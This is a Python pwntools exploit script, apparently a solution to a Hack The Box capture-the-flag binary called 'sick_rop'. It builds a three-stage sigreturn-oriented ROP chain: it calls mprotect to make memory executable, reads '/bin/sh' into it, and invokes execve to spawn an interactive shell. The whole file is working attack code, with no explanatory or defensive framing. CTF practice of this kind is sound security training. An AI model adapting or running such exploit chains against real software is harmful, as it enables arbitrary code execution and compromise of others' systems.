import pathlib

from core.target_config import Config, Mode
from core.targetbase import TargetBase
from pwn import p64, u64
from pwn import SigreturnFrame
from pwnlib.tubes.process import process
from abstract.pwntarget import PwnTarget


class SickROPPwn(PwnTarget):
    @classmethod
    def main(cls, proc: process, payload: bytes, pwn_target, *args, **kwargs):
        proc.send_raw(payload)

    @classmethod
    def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
        return proc.recv(len(payload))


if __name__ == '__main__':
    config = Config(
        rop=True,
        mode=Mode.local,
        file=pathlib.Path('/home/lim8en1/htb/projects-archive/sick_rop/sick_rop'),
        detect_libc=True,
        main_function_name='vuln',
        offset=0x20
    )
    t = TargetBase(pwn_target=SickROPPwn, config=config)

    read_ptr = t.file.symbols["read"]
    write_ptr = t.file.symbols["write"]
    start_ptr = t.file.symbols["_start"]
    vuln_ptr = t.file.symbols["vuln"]

    symtab_section = t.file.get_section_by_name('.symtab')
    symtab_data = symtab_section.data()
    symtab_address = t.file.address + symtab_section.header.sh_offset
    t.logger.info(f'Symtab location {hex(symtab_address)}')

    new_stack = None

    for address in range(0, symtab_section.header.sh_size, 0x18):
        symbol_address = u64(symtab_data[address+0x8:address+0x10])
        if start_ptr == symbol_address:
            new_stack = symtab_address + address + 0x8
            t.logger.info(f"Found pointer to _start @ {hex(new_stack)}")
            break
        if vuln_ptr == symbol_address:
            new_stack = symtab_address + address + 0x8
            t.logger.info(f"Found pointer to vuln @ {hex(new_stack)}")
            break
    if not new_stack:
        t.logger.critical("Failed to find new stack ptr")
        exit(0)

    access_flags = 7
    data_ptr = 0x401000
    writable_data = data_ptr + 0x800
    data_size = 0x1000

    desired_syscall = 15
    syscall_ret_gadget = t.rop.find_gadget(['syscall', 'ret']).address + t.base_address_fix
    ret_gadget = t.rop.find_gadget(['ret']).address + t.base_address_fix

    stage1_frame = SigreturnFrame(arch="amd64", kernel="amd64")
    stage1_frame.rax = 10
    stage1_frame.rdi = data_ptr
    stage1_frame.rsi = data_size
    stage1_frame.rdx = access_flags
    stage1_frame.rip = syscall_ret_gadget
    stage1_frame.rsp = new_stack
    t.logger.info(f"Sending stage 1")
    rop = p64(write_ptr) + p64(syscall_ret_gadget) + p64(read_ptr) + p64(desired_syscall) + bytes(stage1_frame)[0x10:]
    data = t.run_main(t.create_payload(rop))
    t.process.recv(desired_syscall)

    stage2_frame = SigreturnFrame(arch='amd64', kernel='amd64')
    stage2_frame.rax = 0
    stage2_frame.rdi = 0
    stage2_frame.rsi = writable_data
    stage2_frame.rdx = 0x100
    stage2_frame.rip = syscall_ret_gadget
    stage2_frame.rsp = writable_data+0x80
    t.logger.info(f"Sending stage 2")

    rop = p64(write_ptr) + p64(syscall_ret_gadget) + p64(read_ptr) + p64(desired_syscall) + bytes(stage2_frame)[0x10:]
    data = t.run_main(t.create_payload(rop))
    t.process.recv(desired_syscall)
    read_payload = b'/bin/sh' + b'\0' * 0x79 + p64(start_ptr) + p64(start_ptr)
    t.process.sendline(read_payload)

    stage3_frame = SigreturnFrame(arch='amd64', kernel='amd64')
    stage3_frame.rax = 59
    stage3_frame.rdi = writable_data
    stage3_frame.rsi = 0
    stage3_frame.rdx = 0
    stage3_frame.rip = syscall_ret_gadget
    stage3_frame.rsp = writable_data+0x80
    t.logger.info(f"Sending stage 3")
    rop = p64(write_ptr) + p64(syscall_ret_gadget) + p64(read_ptr) + p64(desired_syscall) + bytes(stage3_frame)[0x10:]
    t.run_main(t.create_payload(rop))
    t.process.recv(desired_syscall)
    t.logger.success(f"Spawning shell")
    t.process.interactive()

